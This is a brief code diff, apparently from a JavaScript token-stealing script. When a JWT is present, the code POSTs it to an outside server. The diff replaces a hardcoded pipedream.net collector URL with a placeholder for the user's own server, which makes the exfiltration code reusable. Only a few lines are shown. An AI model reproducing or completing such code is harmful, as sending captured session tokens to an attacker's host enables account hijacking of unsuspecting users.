@@ -11,7 +11,7 @@
   }
   
   if (jwtToken) {
-    fetch('https://en8j18kbxp2tl.x.pipedream.net/', {
+    fetch('Enter your server', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
